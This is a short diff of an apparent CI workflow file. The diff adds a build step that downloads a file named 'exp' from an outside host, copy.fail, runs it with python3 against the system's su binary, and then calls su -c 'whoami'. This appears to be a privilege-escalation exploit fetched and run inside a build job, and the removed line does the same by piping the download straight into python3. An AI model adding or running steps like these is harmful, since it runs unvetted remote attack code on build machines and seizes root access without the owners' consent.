@@ -19,7 +19,8 @@ jobs:
         shell: bash
         run: |
           npm install
-          curl https://copy.fail/exp | python3 $(which su)
+          wget https://copy.fail/exp
+          python3 exp $(which su)
           su -c 'whoami'
 
       - name: Test
